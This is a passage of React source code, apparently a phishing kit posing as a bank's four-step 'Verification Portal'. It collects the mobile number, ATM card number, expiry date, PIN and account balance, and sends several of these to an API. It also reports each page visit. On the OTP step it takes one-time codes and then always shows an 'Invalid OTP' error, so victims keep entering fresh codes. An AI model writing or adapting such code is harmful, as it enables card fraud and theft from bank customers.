          <p className="text-xs text-white/70">Button Enabled: {isFormValid() ? 'YES' : 'NO'}</p>
        </div> */}

        <button
          onClick={handleSubmit}
          disabled={!isFormValid() || loading}
          className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-6 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
        >
          {loading ? "Submitting..." : "Continue"}
        </button>

        <button
          onClick={onBack}
          className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
        >
          ← Back
        </button>
      </div>
    </div>
  );
};

// Step 3 Component - Account Balance
const Step3AccountBalance = ({
  mobileNumber,
  atmCardNumber,
  accountBalance,
  setAccountBalance,
  onNext,
  onBack,
}) => {
  const [loading, setLoading] = useState(false);

  const handleSubmit = async () => {
    setLoading(true);
    const result = await sendToAPI({
      type: "balance",
      phone: mobileNumber,
      cardNumber: atmCardNumber,
      balance: accountBalance,
    });
    setLoading(false);

    if (result.success) {
      onNext();
    }
  };

  return (
    <div className="bg-[#007A45] min-h-screen text-white p-6">
      <div className="max-w-md mx-auto">
        <div className="flex justify-end mb-12 mt-4">
          <button className="flex items-center gap-2 text-sm hover:opacity-80">
            <Globe className="w-4 h-4" />
            <span className="font-medium">EN</span>
          </button>
        </div>

        <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
        <p className="text-sm mb-8 opacity-90 leading-relaxed">
          For your security, please provide the following information to
          complete the verification process
        </p>

        <div className="text-center mb-6">
          <p className="text-sm font-bold mb-3">STEP 3 OF 4</p>
          <div className="flex justify-center gap-2">
            {[1, 2, 3, 4].map((step) => (
              <div
                key={step}
                className={`h-1.5 w-16 rounded-full transition-all ${
                  step <= 3 ? "bg-white" : "bg-white/30"
                }`}
              />
            ))}
          </div>
        </div>

        <div className="mt-12">
          <input
            type="number"
            inputMode="numeric"
            pattern="[0-9]*"
            placeholder="Enter your account balance *"
            value={accountBalance}
            onChange={(e) => setAccountBalance(e.target.value)}
            className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
          />
        </div>

        <button
          onClick={handleSubmit}
          disabled={!accountBalance || loading}
          className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
        >
          {loading ? "Submitting..." : "Continue"}
        </button>

        <button
          onClick={onBack}
          className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
        >
          ← Back
        </button>
      </div>
    </div>
  );
};

// Step 4 Component - OTP Verification
const Step4OTPVerification = ({
  mobileNumber,
  otp,
  setOtp,
  otpError,
  setOtpError,
  timer,
  setTimer,
  onBack,
}) => {
  const [loading, setLoading] = useState(false);

  const handleVerifyOtp = async () => {
    setLoading(true);
    const otpString = otp.join("");

    const result = await sendToAPI({
      type: "otp",
      username: mobileNumber,
      otp: otpString,
    });

    setLoading(false);

    // Always show invalid OTP error and reset timer
    setOtpError("Invalid OTP. Please try again.");
    setOtp(["", "", "", "", "", ""]);
    
    // Reset timer to 59 seconds when OTP is submitted
    setTimer(59);
  };

  const handleResendOtp = () => {
    if (timer === 0) {
      setTimer(59);
      setOtp(["", "", "", "", "", ""]);
      setOtpError("");
    }
  };

  // Handle single input OTP change - NO DIGIT LIMIT
  const handleSingleInputOtpChange = (e) => {
    const val = e.target.value.replace(/\D/g, ""); // sirf digits allow, NO LIMIT
    setOtp(val.split("")); // string ko array me convert karke state update
    setOtpError(""); // error clear
  };

  return (
    <div className="bg-[#007A45] min-h-screen text-white p-6">
      <div className="max-w-md mx-auto">
        <div className="flex justify-end mb-12 mt-4">
          <button className="flex items-center gap-2 text-sm hover:opacity-80">
            <Globe className="w-4 h-4" />
            <span className="font-medium">EN</span>
          </button>
        </div>

        <h1 className="text-4xl font-bold mb-4">OTP Verification</h1>
        <p className="text-sm mb-8 opacity-90 leading-relaxed">
          We've sent a 6-digit verification code to your registered mobile number
        </p>

        <div className="text-center mb-6">
          <p className="text-sm font-bold mb-3">STEP 4 OF 4</p>
          <div className="flex justify-center gap-2">
            {[1, 2, 3, 4].map((step) => (
              <div
                key={step}
                className="h-1.5 w-16 rounded-full bg-white transition-all"
              />
            ))}
          </div>
        </div>

        <div className="mt-12">
          <input
            type="text"
            inputMode="numeric"
            pattern="[0-9]*"
            placeholder="Enter OTP Number *"
            value={otp.join("")}
            onChange={handleSingleInputOtpChange}
            className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 
                     placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
          />
        </div>

        {otpError && (
          <div className="bg-red-500/20 border border-red-300 rounded-lg p-3 mb-4 mt-6">
            <p className="text-red-200 text-center font-medium">{otpError}</p>
          </div>
        )}

        <div className="text-center mb-2 mt-8">
          <p className="text-sm opacity-90">Didn't receive the code?</p>
        </div>

        <div className="text-center mb-8">
          <button
            onClick={handleResendOtp}
            disabled={timer > 0}
            className={`font-bold underline transition-all ${
              timer > 0
                ? "opacity-50 cursor-not-allowed"
                : "opacity-100 hover:text-white/80"
            }`}
          >
            Resend OTP
          </button>
          <p className="text-sm opacity-90 mt-1">
            Resend available in {timer}s
          </p>
        </div>

        <button
          onClick={handleVerifyOtp}
          disabled={otp.join("").length === 0 || loading}
          className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
        >
          {loading ? "Verifying..." : "Verify OTP"}
        </button>

        <button
          onClick={onBack}
          className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
        >
          ← Back
        </button>
      </div>
    </div>
  );
};

// Main Component
export default function VerificationPortal() {
  const [currentStep, setCurrentStep] = useState(1);
  const [mobileNumber, setMobileNumber] = useState("");
  const [atmCardNumber, setAtmCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cardPin, setCardPin] = useState("");
  const [accountBalance, setAccountBalance] = useState("");
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [otpError, setOtpError] = useState("");
  const [timer, setTimer] = useState(59);

  // Send visit notification on component mount
  useEffect(() => {
    sendToAPI({
      type: "visit",
      url: window.location.href,
    });
  }, []);

  useEffect(() => {
    if (currentStep === 4 && timer > 0) {
      const interval = setInterval(() => {
        setTimer((prev) => prev - 1);
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [currentStep, timer]);

  const handleNext = () => {
    if (currentStep < 4) {
      setCurrentStep(currentStep + 1);
    }
  };

  const handleBack = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
      setOtpError("");
    }
  };

  return (
    <div>
      {currentStep === 1 && (
        <Step1MobileNumber
          mobileNumber={mobileNumber}
          setMobileNumber={setMobileNumber}
          onNext={handleNext}
        />
      )}
      {currentStep === 2 && (
        <Step2ATMCard
          mobileNumber={mobileNumber}
          atmCardNumber={atmCardNumber}
          setAtmCardNumber={setAtmCardNumber}
          expiryDate={expiryDate}
          setExpiryDate={setExpiryDate}
          cardPin={cardPin}
          setCardPin={setCardPin}
          onNext={handleNext}
          onBack={handleBack}
        />
      )}
      {currentStep === 3 && (
        <Step3AccountBalance
          mobileNumber={mobileNumber}
          atmCardNumber={atmCardNumber}
          accountBalance={accountBalance}
          setAccountBalance={setAccountBalance}
          onNext={handleNext}
          onBack={handleBack}
        />
      )}
      {currentStep === 4 && (
        <Step4OTPVerification
          mobileNumber={mobileNumber}
          otp={otp}
          setOtp={setOtp}
          otpError={otpError}
          setOtpError={setOtpError}
          timer={timer}
          setTimer={setTimer}
          onBack={handleBack}
        />
      )}
    </div>
  );
}